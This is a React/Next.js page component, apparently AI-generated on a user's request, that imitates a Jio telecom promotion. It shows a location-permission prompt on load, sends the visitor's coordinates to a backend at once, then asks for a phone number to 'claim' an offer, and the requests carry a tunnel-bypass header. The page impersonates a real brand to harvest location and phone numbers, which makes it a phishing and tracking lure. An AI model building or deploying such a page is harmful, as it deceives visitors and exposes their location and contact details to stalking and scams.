'use client';

import { useState } from 'react';
import { LocationPermissionModal } from './components/LocationPermissionModal';
import { PhoneInputForm } from './components/PhoneInputForm';
import { SuccessConfirmation } from './components/SuccessConfirmation';
import { HeroSection } from './components/HeroSection';

type Step = 'hero' | 'location' | 'phone' | 'success';

export default function Home() {
  const [step, setStep] = useState<Step>('location'); // Show location modal initially
  const [locationData, setLocationData] = useState<{
    latitude: number;
    longitude: number;
  } | null>(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleLocationAllow = async (latitude: number, longitude: number) => {
    setIsLoading(true);
    try {
      // Store locally
      setLocationData({ latitude, longitude });

      // Submit location to backend immediately
      await fetch('/api/submit-location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Bypass-Tunnel-Reminder': 'true',
        },
        body: JSON.stringify({ latitude, longitude }),
      });

      setIsLoading(false);
      setStep('hero'); // Go back to hero after location is allowed
    } catch (error) {
      console.error('[v0] Location submit error:', error);
      // Even if API fails, we still want to proceed locally
      setIsLoading(false);
      setStep('hero');
    }
  };

  const handlePhoneSubmit = async (phone: string) => {
    setIsLoading(true);
    try {
      const response = await fetch('/api/submit-location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Bypass-Tunnel-Reminder': 'true',
        },
        body: JSON.stringify({
          // Include location data if we have it, although we already sent it.
          // User said "no problem listing as two different"
          latitude: locationData?.latitude,
          longitude: locationData?.longitude,
          phoneNumber: phone,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to submit data');
      }

      setPhoneNumber(phone);
      setStep('success');
    } catch (error) {
      console.error('[v0] Phone submit error:', error);
      throw error;
    } finally {
      setIsLoading(false);
    }
  };

  const handleClaimClick = () => {
    // If we already have location data, go to phone. Otherwise, show location modal.
    if (locationData) {
      setStep('phone');
    } else {
      setStep('location');
    }
  };

  return (
    <main className="min-h-screen bg-gray-50">
      {/* Header with Jio Logo */}
      <header className="bg-white shadow-sm sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-lg">
              Jio
            </div>
            <span className="text-2xl font-bold text-blue-600">Jio</span>
          </div>
          <nav className="hidden md:flex gap-8">
            <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">
              Plans
            </a>
            <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">
              Devices
            </a>
            <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">
              Support
            </a>
          </nav>
        </div>
      </header>

      {/* Hero Section - Always visible unless phone or success? 
          The user said: "show that asllow location popup" also initially.
          If I show it OVER the hero, it's better.
      */}
      {(step === 'hero' || step === 'location') && (
        <HeroSection onClaimClick={handleClaimClick} />
      )}

      {/* Location Permission Modal - Overlay */}
      {step === 'location' && (
        <LocationPermissionModal
          onAllow={handleLocationAllow}
          isLoading={isLoading}
        />
      )}

      {/* Phone Input Form */}
      {step === 'phone' && (
        <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
          <PhoneInputForm onSubmit={handlePhoneSubmit} isLoading={isLoading} />
        </div>
      )}

      {/* Success Confirmation */}
      {step === 'success' && <SuccessConfirmation phoneNumber={phoneNumber} />}

      {/* Success Background when showing confirmation */}
      {step === 'success' && (
        <div className="fixed inset-0 -z-10 bg-gradient-to-br from-green-50 to-blue-50"></div>
      )}
    </main>
  );
}

